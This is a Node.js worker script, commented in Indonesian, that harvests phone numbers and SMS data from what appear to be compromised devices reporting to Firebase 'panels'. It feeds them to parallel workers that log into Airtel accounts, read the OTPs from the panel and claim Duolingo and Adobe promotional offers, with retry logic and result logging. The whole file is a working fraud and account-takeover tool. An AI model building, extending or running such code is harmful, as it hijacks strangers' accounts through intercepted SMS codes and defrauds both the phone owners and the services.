import chalk from 'chalk';
import { loadEnv, sleep, C, getClaimedNumbers, checkOperator } from './src/utils.mjs';
import { collectDevicesAndNumbers } from './src/firebase-client.mjs';
import { processAirtelNumber } from './src/airtel-worker.mjs';
import { FIREBASE_PANELS } from './panels.mjs';

loadEnv();

process.on("unhandledRejection", () => {});
process.on("uncaughtException", () => {});

const stats = {
  totalScanned: 0, airtelFound: 0, alreadyClaimed: 0, otpReceived: 0,
  duolingoClaimed: 0, adobeClaimed: 0, failed: 0, skipped: 0
};

function printBanner() {
  console.log(`\n${C.bold}${C.brightCyan}=================================================================${C.reset}`);
  console.log(`${C.bold}${C.brightCyan}             DUOLINGO x AIRTEL FIREBASE PANEL WORKER             ${C.reset}`);
  console.log(`${C.bold}${C.brightCyan}=================================================================${C.reset}\n`);
}

// Timeout maksimal per nomor: 3 menit (login + tunggu OTP 2 menit + claim)
const WORKER_TIMEOUT_MS = 180000;

function withTimeout(promise, ms) {
  return Promise.race([
    promise,
    new Promise((_, reject) => setTimeout(() => reject(new Error(`TIMEOUT setelah ${ms/1000}s`)), ms))
  ]);
}

async function runWorker(workerIndex, numberQueue, isHeadless, totalQueue, progressRef, retryQueue) {
  while (numberQueue.length > 0) {
    const item = numberQueue.shift();
    if (!item) break;
    const { number, deviceInfo } = item;
    progressRef.done++;
    console.log(`[Worker ${workerIndex}] ${C.cyan}▶ [${progressRef.done}/${totalQueue}] Memproses ${number} | device: ${deviceInfo.deviceId || 'unknown'} | panel: ${deviceInfo.baseUrl || 'unknown'} | source: ${item.source}${C.reset}`);

    // PENTING: consumedKeys di-snapshot FRESH per nomor, bukan diteruskan antar nomor.
    // Setiap nomor harus memulai dengan keys kosong agar OTP yang masuk
    // selama proses nomor sebelumnya tidak ter-skip.
    // (pola gemini-jio: knownKeys diambil tepat sebelum sendOtp)
    const freshConsumedKeys = new Set();

    try {
      const result = await withTimeout(
        processAirtelNumber(number, deviceInfo, workerIndex, isHeadless, freshConsumedKeys),
        WORKER_TIMEOUT_MS
      );
      if (result.duolingo) stats.duolingoClaimed++;
      if (result.adobe) stats.adobeClaimed++;
      if (result.success) stats.otpReceived++;
      else {
        stats.failed++;
        // Retry untuk error yang layak: OTP gagal, atau klaim gagal padahal
        // akun sudah login & eligible (REDEEM_LINK_NOT_FOUND / CLICK_CLAIM_FAIL /
        // ALREADY_CLAIMED tidak di-retry karena sudah pasti selesai).
        const retryableClaim = result.error === 'REDEEM_LINK_NOT_FOUND' || result.error === 'CLICK_CLAIM_FAIL';
        if (retryQueue && (result.error === 'OTP_TIMEOUT' || retryableClaim)) {
          retryQueue.push(item);
        }
      }
    } catch (err) {
      stats.failed++;
      console.log(`[Worker ${workerIndex}] ${C.red}✘ Skip ${number}: ${err.message}${C.reset}`);
      // Push ke retry queue jika timeout global atau error stage klaim
      const retryableClaim = err.message.includes('REDEEM_LINK_NOT_FOUND') || err.message.includes('CLICK_CLAIM_FAIL');
      if (retryQueue && (err.message.includes('TIMEOUT') || retryableClaim)) {
        retryQueue.push(item);
      }
    }
    await sleep(1000);
  }
}


async function main() {
  console.clear();
  printBanner();

  const panels = FIREBASE_PANELS;
  if (!panels || panels.length === 0) {
    console.log(chalk.red('❌ Tidak ada panel dikonfigurasi!'));
    console.log(chalk.yellow('   Edit file panels.mjs untuk menambahkan URL panel Firebase.'));
    process.exit(1);
  }

  const isHeadless = process.env.HEADLESS !== 'false';
  const maxWorkers = parseInt(process.env.MAX_WORKERS || '4', 10);
  const scanLimit = parseInt(process.env.MESSAGE_SCAN_LIMIT || '50', 10);
  const testMode = process.env.TEST_MODE === 'true';
  const targetNumber = (process.env.TARGET_NUMBER || '').replace(/\D/g, '').slice(-10);

  console.log(`${C.brightWhite}Panel Firebase : ${C.bold}${panels.length} panel(s)${C.reset}`);
  console.log(`${C.brightWhite}Mode Headless  : ${C.bold}${isHeadless ? 'Ya' : 'Tidak'}${C.reset}`);
  console.log(`${C.brightWhite}Max Workers    : ${C.bold}${maxWorkers}${C.reset}\n`);

  console.log(`${C.brightYellow}⏳ Scanning Firebase panels...${C.reset}`);
  const devices = await collectDevicesAndNumbers(panels, scanLimit);

  const numberQueue = [];
  const seenNumbers = new Set();

  // Urutkan device: yang paling baru menerima OTP Airtel didahulukan.
  // Recency = proxy keandalan SIM: nomor dari SMS 40+ hari lalu sering sudah
  // kehilangan masa aktif (validity) sehingga OTP tidak akan masuk, sedangkan
  // device yang baru saja menerima OTP Airtel pasti SIM aktif.
  devices.sort((a, b) => (b.lastOtpAirtelTime || 0) - (a.lastOtpAirtelTime || 0));

  // Prioritas 1: Nomor SIM dari messages (field phoneNumber/simInfo + body SMS
  // operator "Airtel No. XXX"). Device record TIDAK dipakai lagi karena hanya
  // berisi nomor TUJUAN outbound (bukan nomor SIM device).
  // Device dengan airtelOtpIncoming=true sudah terbukti SIM Airtel aktif
  // (pernah terima SMS OTP Airtel), jadi prioritaskan dan percaya verdict-nya.
  // Hanya ambil 1 nomor per device (anti rate-limit Airtel).
  const claimedNumbers = getClaimedNumbers('duolingo');
  if (claimedNumbers.size > 0) {
    console.log(`${C.dim}ℹ Terdeteksi ${claimedNumbers.size} nomor sudah sukses diklaim sebelumnya di duolingo_result.txt${C.reset}`);
  }

  const DAY_MS = 24 * 60 * 60 * 1000;
  for (const dev of devices) {
    const sims = [...(dev.simNumbers || new Set())]; // urutan = prioritas (insertion order)
    if (sims.length === 0) continue;
    const candidates = targetNumber ? sims.filter(n => n === targetNumber) : sims.slice(0, 3);
    let picked = false;
    for (const num of candidates) {
      if (seenNumbers.has(num)) { picked = true; break; }
      const isTarget = targetNumber && num === targetNumber;
      if (!testMode && !isTarget && claimedNumbers.has(num)) {
        stats.alreadyClaimed++;
        continue;
      }
      stats.totalScanned++;
      const gate = checkOperator(num);
      const smsOp = (dev.smsOperator || 'unknown').toLowerCase();
      const provenAirtel = !!dev.airtelOtpIncoming;
      const numTs = (dev.numBodyTime && dev.numBodyTime[num]) || 0;
      const baseTs = numTs > 0 ? numTs : (dev.lastActivityTime || 0);
      const ageDays = baseTs > 0 ? Math.floor((Date.now() - baseTs) / DAY_MS) : -1;
      const smsSaysNonAirtel = !provenAirtel && ['jio', 'vi', 'bsnl'].includes(smsOp);
      const stale = ageDays >= 30;

      if (testMode || isTarget || (!stale && (provenAirtel || (gate.verdict === 'airtel' && !smsSaysNonAirtel)))) {
        seenNumbers.add(num);
        stats.airtelFound++;
        numberQueue.push({ number: num, deviceInfo: dev, source: 'sim' });
        console.log(`  ✔ Terpilih: ${C.bold}${C.brightGreen}${num}${C.reset} (SIM Airtel Aktif)`);
        picked = true;
        break; // 1 nomor per device saja
      } else {
        stats.skipped++;
      }
    }
  }

  // FORCE INJECT: Jika TEST_MODE=true dan TARGET_NUMBER diset tapi tidak ketemu di scan
  if (testMode && targetNumber && numberQueue.length === 0) {
    console.log(chalk.yellow('\n⚡ TEST_MODE aktif: Memaksa inject TARGET_NUMBER ' + targetNumber + ' ke antrian...'));
    const firstDev = devices.length > 0 ? devices[0] : { deviceId: 'unknown', numbers: new Set(), simNumbers: new Set() };
    numberQueue.push({ number: targetNumber, deviceInfo: firstDev, source: 'forced' });
    stats.airtelFound++;
  }

  console.log(`\n${C.brightGreen}✔ Scan selesai!${C.reset}`);
  console.log(`  Nomor Airtel siap proses : ${C.bold}${C.brightGreen}${stats.airtelFound}${C.reset}`);
  if (stats.alreadyClaimed > 0) {
    console.log(`  Sudah pernah diklaim     : ${stats.alreadyClaimed} nomor (di-skip)`);
  }
  if (stats.skipped > 0) {
    console.log(`  Non-Airtel / SIM mati    : ${stats.skipped} nomor (di-skip)`);
  }
  console.log('');
  const maxNumbers = parseInt(process.env.MAX_NUMBERS || '0', 10);
  if (maxNumbers > 0 && numberQueue.length > maxNumbers) {
    console.log(`${C.yellow}ℹ Membatasi antrian menjadi ${maxNumbers} nomor terbaik (MAX_NUMBERS=${maxNumbers})${C.reset}\n`);
    numberQueue.splice(maxNumbers);
  }

  if (numberQueue.length === 0) {
    if (targetNumber) console.log(chalk.red('❌ Nomor ' + targetNumber + ' TIDAK DITEMUKAN di SMS manapun. Pastikan nomor muncul di isi SMS device Firebase.'));
    console.log(chalk.yellow('⚠️ Tidak ada nomor Airtel yang ditemukan di panel Firebase.'));
    console.log(chalk.dim('   Coba jalankan ulang nanti atau tambahkan panel baru.\n'));
    return;
  }

  const workerCount = Math.min(maxWorkers, numberQueue.length);
  console.log(`${C.brightCyan}🚀 Memulai ${workerCount} worker paralel...\n${C.reset}`);

  const progressRef = { done: 0 };
  const totalQueue = numberQueue.length;
  console.log(`${C.brightYellow}📋 Total antrian: ${totalQueue} nomor Airtel${C.reset}\n`);

  // Retry queue untuk nomor yang gagal OTP_TIMEOUT (pola gemini-jio)
  const retryQueue = [];

  const workers = [];
  for (let i = 0; i < workerCount; i++) {
    workers.push(runWorker(i + 1, numberQueue, isHeadless, totalQueue, progressRef, retryQueue));
  }
  await Promise.allSettled(workers);
  console.log(`\n${C.brightGreen}✔ Batch pertama selesai!${C.reset}`);

  // ============================================
  // RETRY PASS (pola gemini-jio)
  // Proses ulang nomor-nomor yang gagal OTP_TIMEOUT
  // ============================================
  if (retryQueue.length > 0) {
    console.log(`\n${C.brightYellow}🔄 Memulai retry pass untuk ${retryQueue.length} nomor yang gagal...${C.reset}\n`);
    progressRef.done = 0;
    const retryTotal = retryQueue.length;
    const retryWorkerCount = Math.min(maxWorkers, retryQueue.length);
    const retryWorkers = [];
    for (let i = 0; i < retryWorkerCount; i++) {
      retryWorkers.push(runWorker(i + 1, retryQueue, isHeadless, retryTotal, progressRef, null)); // null = no double retry
    }
    await Promise.allSettled(retryWorkers);
    console.log(`\n${C.brightGreen}✔ Retry pass selesai!${C.reset}`);
  }
  console.log(`\n${C.brightGreen}✔ Semua worker selesai!${C.reset}`);

  console.log(`\n${C.bold}${C.brightGreen}=================================================================${C.reset}`);
  console.log(`${C.bold}${C.brightGreen}                      RINGKASAN HASIL                            ${C.reset}`);
  console.log(`${C.bold}${C.brightGreen}=================================================================${C.reset}`);
  console.log(`  Duolingo Claimed : ${C.bold}${C.brightGreen}${stats.duolingoClaimed}${C.reset}`);
  console.log(`  Adobe Claimed    : ${C.bold}${C.brightCyan}${stats.adobeClaimed}${C.reset}`);
  console.log(`  Failed           : ${C.bold}${C.red}${stats.failed}${C.reset}`);
  console.log(`${C.brightGreen}=================================================================${C.reset}`);
  console.log(`${C.brightGreen}Selesai! Cek file hasil:${C.reset}`);
  console.log(`  Duolingo : ${C.bold}duolingo_result.txt${C.reset}`);
  console.log(`  Adobe    : ${C.bold}adobe_result.txt${C.reset}`);
  console.log(`  Audit    : ${C.bold}audit_log.txt${C.reset}\n`);
}

main().catch(err => {
  console.error(chalk.red(`\n❌ Fatal Error: ${err.message}`));
  process.exit(1);
});